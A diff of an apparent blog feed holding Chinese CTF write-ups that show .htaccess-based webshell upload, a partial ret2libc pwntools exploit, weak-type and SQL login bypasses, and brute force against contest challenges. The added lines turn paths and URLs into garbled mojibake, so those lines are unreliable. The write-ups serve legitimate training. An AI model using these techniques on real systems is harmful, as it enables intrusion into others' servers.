+    <link href="http://iosmosis.github.io/2018/06/12/%E2%95%9A%D0%BB%E2%95%A3%C2%B7%E2%95%93%E2%95%A8%E2%95%A4%D0%B7%E2%95%94%C2%B7%E2%95%90%C2%B0%E2%94%AC%D1%87%E2%96%91%E2%96%93%E2%95%9A%D0%BB%E2%95%9D%E2%95%9D%E2%95%A9%D1%97%E2%94%A4%D1%94%E2%95%9A%E2%84%96-Writeup/"/>
+    <id>http://iosmosis.github.io/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/</id>
     <published>2018-06-12T03:10:55.000Z</published>
-    <updated>2018-06-12T03:37:51.493Z</updated>
+    <updated>2018-06-12T03:37:52.000Z</updated>
     
     <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>打开题目得到flag</p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -2472,15 +2562,15 @@ Welcome to msscstc!
 This is your flag: flag{4f403810354870e07cb00b549cf577c9}
 
 good luck &amp;&amp; have fun!
-</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby upload"></a>baby upload</h2><p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/1.jpg" alt="ida1"><br>测试了没被禁用的上传点 发现上传没有任何反应 发现第三个禁用了 所以通过审查元素更改<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/2.jpg" alt="ida1"><br>根据hint提示 了解到 .htaccesss</p>
+</code></pre><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby upload"></a>baby upload</h2><p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/1.jpg" alt="ida1"><br>测试了没被禁用的上传点 发现上传没有任何反应 发现第三个禁用了 所以通过审查元素更改<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/2.jpg" alt="ida1"><br>根据hint提示 了解到 .htaccesss</p>
 <p>上传当前目录的.htaccess 文件</p>
 <p>例如内容为： AddType application/x-http-php .jpg   (上传的jpg 均以php执行)</p>
 <p>把.htaccess 上传后，且上传成功后，再上传内容为一句话的jpg文件</p>
-<p>所以构造上传<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/3.jpg" alt="ida1"></p>
-<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/4.jpg" alt="ida1"><br>这里修改为.htaccess 放行<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/5.jpg" alt="ida1"></p>
-<p>成功覆盖<br>接着上传jpg的小马 或者一句话<br>尝试传小马貌似有问题 这里改用post<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/6.jpg" alt="ida1"></p>
-<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/7.jpg" alt="ida1"><br>尝试一句话<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/8.jpg" alt="ida1"><br>尝试上传<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/9.jpg" alt="ida1"><br>成功解析<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/10.jpg" alt="ida1"></p>
-<p>执行find 找到flag目录<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/11.jpg" alt="ida1"><br>cat 得到flag<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/12.jpg" alt="ida1"></p>
+<p>所以构造上传<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/3.jpg" alt="ida1"></p>
+<p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/4.jpg" alt="ida1"><br>这里修改为.htaccess 放行<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/5.jpg" alt="ida1"></p>
+<p>成功覆盖<br>接着上传jpg的小马 或者一句话<br>尝试传小马貌似有问题 这里改用post<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/6.jpg" alt="ida1"></p>
+<p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/7.jpg" alt="ida1"><br>尝试一句话<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/8.jpg" alt="ida1"><br>尝试上传<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/9.jpg" alt="ida1"><br>成功解析<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/10.jpg" alt="ida1"></p>
+<p>执行find 找到flag目录<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/11.jpg" alt="ida1"><br>cat 得到flag<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/12.jpg" alt="ida1"></p>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>这里感谢一波出题人 放出了libc<br>载入ida分析</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">sub_804857B</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -2495,9 +2585,9 @@ good luck &amp;&amp; have fun!
 </code></pre>
 <p>之前利用思路 a*buffer+jmp esp+shellcode</p>
 <p>But..</p>
-<p><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/13.jpg" alt="ida1"><br>NX开启 RELRO开启<br>所以 直接写shellcode就没办法了 </p>
+<p><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/13.jpg" alt="ida1"><br>NX开启 RELRO开启<br>所以 直接写shellcode就没办法了 </p>
 <p>通过leak puts_addr 找到 system binsh 的真实地址</p>
-<p>Leak通过 sub_804857B() 构造循环<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/14.jpg" alt="ida1"></p>
+<p>Leak通过 sub_804857B() 构造循环<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/14.jpg" alt="ida1"></p>
 <p>本地EXP</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
@@ -2560,7 +2650,7 @@ payload2<span class="token operator">=</span><span class="token string">'a'</spa
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p>得到flag<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/15.jpg" alt="ida1"></p>
+<p>得到flag<br><img src="/2018/06/12/╚л╣·╓╨╤з╔·═°┬ч░▓╚л╝╝╩ї┤є╚№-Writeup/全国中学生网络安全技术大赛-Writeup/15.jpg" alt="ida1"></p>
 ]]></content>
     
     <summary type="html">
@@ -2586,10 +2676,10 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
   
   <entry>
     <title>2018北邮自招复试-CTF-Writeup</title>
-    <link href="http://iosmosis.github.io/2018/06/10/%E5%8C%97%E9%82%AE%E8%87%AA%E6%8B%9B%E5%A4%8D%E8%AF%95-CTF-Writeup/"/>
-    <id>http://iosmosis.github.io/2018/06/10/北邮自招复试-CTF-Writeup/</id>
+    <link href="http://iosmosis.github.io/2018/06/10/%E2%96%92%E2%96%92%E2%95%99%E2%95%A9%E2%95%AB%E2%95%98%E2%95%92%E2%95%A8%E2%95%95%E2%94%A4%E2%95%A9%E2%95%98-CTF-Writeup/"/>
+    <id>http://iosmosis.github.io/2018/06/10/▒▒╙╩╫╘╒╨╕┤╩╘-CTF-Writeup/</id>
     <published>2018-06-10T13:41:48.000Z</published>
-    <updated>2018-06-12T15:30:20.996Z</updated>
+    <updated>2018-06-12T15:30:22.000Z</updated>
     
     <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>右键查看网站源码</p>
 <p></p><p class="code-caption" data-lang="html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
@@ -2934,18 +3024,18 @@ S <span class="token operator">=</span> Solver<span class="token punctuation">(<
     
       <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
     
-      <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
-    
       <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
+    
+      <category term="BUPT" scheme="http://iosmosis.github.io/tags/BUPT/"/>
     
   </entry>
   
   <entry>
     <title>Syclover-Pwn-练习题</title>
-    <link href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
-    <id>http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/</id>
+    <link href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-%E2%94%B4%E2%95%96%E2%95%A7%E2%96%91%E2%95%A0%D1%82/"/>
+    <id>http://iosmosis.github.io/2018/06/09/Syclover-Pwn-┴╖╧░╠т/</id>
     <published>2018-06-09T09:56:41.000Z</published>
-    <updated>2018-06-10T13:50:04.104Z</updated>
+    <updated>2018-06-10T13:50:06.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec stack1
@@ -3015,30 +3105,30 @@ ios@ubuntu:~$
   
   <entry>
     <title>NPUCTF部分Writeup</title>
-    <link href="http://iosmosis.github.io/2018/05/13/NPUCTF%E9%83%A8%E5%88%86Writeup/"/>
-    <id>http://iosmosis.github.io/2018/05/13/NPUCTF部分Writeup/</id>
+    <link href="http://iosmosis.github.io/2018/05/13/NPUCTF%E2%96%93%E2%94%90%E2%95%96%E2%95%93Writeup/"/>
+    <id>http://iosmosis.github.io/2018/05/13/NPUCTF▓┐╖╓Writeup/</id>
     <published>2018-05-13T07:39:42.000Z</published>
-    <updated>2018-05-27T11:00:03.441Z</updated>
+    <updated>2018-05-27T11:00:04.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/1.jpg" alt="ida1"></p>
-<p>查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/2.jpg" alt="ida1"><br>得到Flag : flag{begin_to_npuctf}</p>
+    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/1.jpg" alt="ida1"></p>
+<p>查看源码<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/2.jpg" alt="ida1"><br>得到Flag : flag{begin_to_npuctf}</p>
 <ul>
 <li><a id="more"></a>
 <the rest="" of="" contents="" |="" 余下全文=""><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2></the></li>
 </ul>
-<p><img src="/2018/05/13/NPUCTF部分Writeup/3.jpg" alt="ida1"><br>猜测应该是js算法题目</p>
-<p>查看源码发现主要算法<br><img src="/2018/05/13/NPUCTF部分Writeup/4.jpg" alt="ida1"></p>
+<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/3.jpg" alt="ida1"><br>猜测应该是js算法题目</p>
+<p>查看源码发现主要算法<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/4.jpg" alt="ida1"></p>
 <h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>可以看到</p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>var b = &quot;56ab34c15b73a457069c58a43fcfc640&quot;;
 var d = 0x0;
 var e = a.substr(0x8, 0x5);
 if ($.md5(e) == b.replace(/3/ig, ++d+1).replace(/8/ig, &#39;e&#39;))
-</code></pre><p>通过控制台可以获得e<br><img src="/2018/05/13/NPUCTF部分Writeup/5.jpg" alt="ida1"><br>解密可以获得9-13位 happy</p>
+</code></pre><p>通过控制台可以获得e<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/5.jpg" alt="ida1"><br>解密可以获得9-13位 happy</p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>if (f.substr(0x5, 0x2) == &quot;be&quot; &amp;&amp; $.md5(f.substr(0x0 / d, d + 0x3)) == &quot;327a6c4304ad5938eaf0efb6cc3e53dc&quot;) {
 </code></pre><p>可得 6 7位为 be<br>解密  327a6c4304ad5938eaf0efb6cc3e53dc 可获得 0-3位为 flag</p>
-<p><img src="/2018/05/13/NPUCTF部分Writeup/6.jpg" alt="ida1"></p>
+<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/6.jpg" alt="ida1"></p>
 <p>运行可以获得g=np</p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>if (r.substr((++d) * 0x3, 0x6) == g.concat(&quot;uctf&quot;) &amp;&amp; c.test(a)) {
@@ -3052,20 +3142,20 @@ if ($.md5(e) == b.replace(/3/ig, ++d+1).replace(/8/ig, &#39;e&#39;))
 <p>var r = ‘_’</p>
 <p>console.log(r.charCodeAt(0))</p>
 <p>console.log(String.fromCharCode(95+25))<br>所以最后拼接可得<br>flag{be_happy_xxnpuctf}</p>
-<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>题目：你需要懂一些Linux命令，已经为你装好了某著名黑客工具。<br><img src="/2018/05/13/NPUCTF部分Writeup/7.jpg" alt="ida1"><br>测试可知 可以执行一些命令 并且 ls列出了flag所在目录<br><img src="/2018/05/13/NPUCTF部分Writeup/8.jpg" alt="ida1"><br>但是却无法使用 cd cat 等一系列命令</p>
-<p>右键查看源码<br><img src="/2018/05/13/NPUCTF部分Writeup/9.jpg" alt="ida1"><br>发现提示 可以猜测应该 是可以使用nmap<br>所以使用命令 </p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>题目：你需要懂一些Linux命令，已经为你装好了某著名黑客工具。<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/7.jpg" alt="ida1"><br>测试可知 可以执行一些命令 并且 ls列出了flag所在目录<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/8.jpg" alt="ida1"><br>但是却无法使用 cd cat 等一系列命令</p>
+<p>右键查看源码<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/9.jpg" alt="ida1"><br>发现提示 可以猜测应该 是可以使用nmap<br>所以使用命令 </p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>nmap -iL /tmp/flag/flag.txt
-</code></pre><p><img src="/2018/05/13/NPUCTF部分Writeup/10.jpg" alt="ida1"><br>得到Flag : flag{nice_Command}</p>
-<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="/2018/05/13/NPUCTF部分Writeup/11.jpg" alt="ida1"><br>进入发现需要登录</p>
-<p>右键查看源码得到提示<br><img src="/2018/05/13/NPUCTF部分Writeup/12.jpg" alt="ida1"><br>这里存在PHP弱类型漏洞 提交name=240610708 pass=QNKCDZO 成功绕过</p>
-<p><img src="/2018/05/13/NPUCTF部分Writeup/13.jpg" alt="ida1"></p>
+</code></pre><p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/10.jpg" alt="ida1"><br>得到Flag : flag{nice_Command}</p>
+<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/11.jpg" alt="ida1"><br>进入发现需要登录</p>
+<p>右键查看源码得到提示<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/12.jpg" alt="ida1"><br>这里存在PHP弱类型漏洞 提交name=240610708 pass=QNKCDZO 成功绕过</p>
+<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/13.jpg" alt="ida1"></p>
 <h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p> 根据放的hint可尝试万能密码绕过<br>提交 ‘or’=’or’ 成功绕过</p>
-<p><img src="/2018/05/13/NPUCTF部分Writeup/14.jpg" alt="ida1"></p>
+<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/14.jpg" alt="ida1"></p>
 <h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>提示了name为 npusec 但是密码未知所以这里猜测需要爆破密码</p>
 <p>通过robots.txt泄露 </p>
-<p><img src="/2018/05/13/NPUCTF部分Writeup/15.jpg" alt="ida1"><br>得到 密码字典 所以进行爆破即可</p>
-<p><img src="/2018/05/13/NPUCTF部分Writeup/16.jpg" alt="ida1"><br>得到密码为 1234npuuu<br><img src="/2018/05/13/NPUCTF部分Writeup/17.jpg" alt="ida1"><br>登录获得Flag : flag{W3lcOme_com3_to_ctf}</p>
+<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/15.jpg" alt="ida1"><br>得到 密码字典 所以进行爆破即可</p>
+<p><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/16.jpg" alt="ida1"><br>得到密码为 1234npuuu<br><img src="/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/17.jpg" alt="ida1"><br>登录获得Flag : flag{W3lcOme_com3_to_ctf}</p>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="pwn-checkin"><a href="#pwn-checkin" class="headerlink" title="pwn_checkin"></a>pwn_checkin</h2><p>载入ida分析</p>
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
@@ -3344,8 +3434,8 @@ $
     
     <summary type="html">
     
-      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2018/05/13/NPUCTF部分Writeup/1.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;/p&gt;
-&lt;p&gt;查看源码&lt;br&gt;&lt;img src=&quot;/2018/05/13/NPUCTF部分Writeup/2.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;br&gt;得到Flag : flag{begin_to_npuctf}&lt;/p&gt;
+      &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/1.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;/p&gt;
+&lt;p&gt;查看源码&lt;br&gt;&lt;img src=&quot;/2018/05/13/NPUCTF▓┐╖╓Writeup/NPUCTF部分Writeup/2.jpg&quot; alt=&quot;ida1&quot;&gt;&lt;br&gt;得到Flag : flag{begin_to_npuctf}&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
     
@@ -3364,29 +3454,29 @@ $
   
   <entry>
     <title>北邮网安杯Writeup</title>
-    <link href="http://iosmosis.github.io/2018/04/03/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AFWriteup/"/>
-    <id>http://iosmosis.github.io/2018/04/03/北邮网安杯Writeup/</id>
+    <link href="http://iosmosis.github.io/2018/04/03/%E2%96%92%E2%96%92%E2%95%99%E2%95%A9%E2%95%90%C2%B0%E2%96%91%E2%96%93%E2%96%92%D0%BDWriteup/"/>
+    <id>http://iosmosis.github.io/2018/04/03/▒▒╙╩═°░▓▒нWriteup/</id>
     <published>2018-04-02T16:44:19.000Z</published>
-    <updated>2018-06-09T08:28:48.424Z</updated>
+    <updated>2018-06-09T08:28:50.000Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="WEB1-交易中心，你能买到FLAG吗？"><a href="#WEB1-交易中心，你能买到FLAG吗？" class="headerlink" title="WEB1 交易中心，你能买到FLAG吗？"></a>WEB1 交易中心，你能买到FLAG吗？</h3><p>提供了源码下载<br><img src="/2018/04/03/北邮网安杯Writeup/3.jpg" alt="源码"></p>
+    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="WEB1-交易中心，你能买到FLAG吗？"><a href="#WEB1-交易中心，你能买到FLAG吗？" class="headerlink" title="WEB1 交易中心，你能买到FLAG吗？"></a>WEB1 交易中心，你能买到FLAG吗？</h3><p>提供了源码下载<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/3.jpg" alt="源码"></p>
 <ul>
 <li><a id="more"></a>
 <the rest="" of="" contents="" |="" 余下全文="">
 
 </the></li>
 </ul>
-<p><img src="/2018/04/03/北邮网安杯Writeup/1.jpg" alt="网站入口"></p>
+<p><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/1.jpg" alt="网站入口"></p>
 <ul>
 <li><!-- more -->
-<the rest="" of="" contents="" |="" 余下全文=""><br>分析源码<br><img src="/2018/04/03/北邮网安杯Writeup/2.jpg" alt="源码分析"></the></li>
+<the rest="" of="" contents="" |="" 余下全文=""><br>分析源码<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/2.jpg" alt="源码分析"></the></li>
 </ul>
-<p>POST三个参数 并且通过||进行拼接 这样最后的payment应该为goods||message||goods<br><img src="/2018/04/03/北邮网安杯Writeup/4.jpg" alt="源码分析2"></p>
+<p>POST三个参数 并且通过||进行拼接 这样最后的payment应该为goods||message||goods<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/4.jpg" alt="源码分析2"></p>
 <h4 id="了解到intval-函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。"><a href="#了解到intval-函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。" class="headerlink" title="了解到intval()函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。"></a>了解到intval()函数功能1、参数一定是数字否则会报错，2、如果是数字那一定是整数，如果有小点，那会省略掉，3，强调参数可以有“-”值。4、参数第一位不应为0开头，不然会自动转换十进制。</h4><p>而参数message可控 所以可以想出让intval转换停在message所传值后面利用既然是利用||分割进行转换 所以这里传值时打乱原有的||分割使payment再次被分割时出现非数字使之停止</p>
 <p>构造 直接在POST写入<br>所以构造payload：goods=4&amp;message=40|(此处为当时测试所用值)&amp;goods=1000<br>所得之后的数据为4||40|||1000 分割后会导致第三数据的1000变为|1000<br>提交得到flag</p>
-<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>运行程序了解程序流程<br><img src="/2018/04/03/北邮网安杯Writeup/5.jpg" alt="程序测试"></p>
-<p>进行了长度判断<br>不是很会RE 发现没有定位到main入口 就IDA+OD分析<br>定位到相关汇编代码<br><img src="/2018/04/03/北邮网安杯Writeup/6.jpg" alt="IDA1"></p>
-<p>进行判断长度需要大于0Ah小于23h<br><img src="/2018/04/03/北邮网安杯Writeup/7.jpg" alt="IDA2"><br>shift+F12 字符串搜索<br><img src="/2018/04/03/北邮网安杯Writeup/16.jpg" alt="IDA2"><br>定位到data<br><img src="/2018/04/03/北邮网安杯Writeup/17.jpg" alt="IDA2"><br>双击<br>DATA XREF 找到原引用位置<br><img src="/2018/04/03/北邮网安杯Writeup/18.jpg" alt="IDA2"><br><img src="/2018/04/03/北邮网安杯Writeup/19.jpg" alt="IDA2"><br>通过快捷键P create一个函数 得到主体函数<br>然后再通过F5转为C </p>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Re1"><a href="#Re1" class="headerlink" title="Re1"></a>Re1</h3><p>运行程序了解程序流程<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/5.jpg" alt="程序测试"></p>
+<p>进行了长度判断<br>不是很会RE 发现没有定位到main入口 就IDA+OD分析<br>定位到相关汇编代码<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/6.jpg" alt="IDA1"></p>
+<p>进行判断长度需要大于0Ah小于23h<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/7.jpg" alt="IDA2"><br>shift+F12 字符串搜索<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/16.jpg" alt="IDA2"><br>定位到data<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/17.jpg" alt="IDA2"><br>双击<br>DATA XREF 找到原引用位置<br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/18.jpg" alt="IDA2"><br><img src="/2018/04/03/▒▒╙╩═°░▓▒нWriteup/北邮网安杯Writeup/19.jpg" alt="IDA2"><br>通过快捷键P create一个函数 得到主体函数<br>然后再通过F5转为C </p>
 <p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre><code>unsigned int __thiscall sub_401490(CWnd *this)
 {
@@ -3488,7 +3578,7 @@ $
   }
   return result;
 }
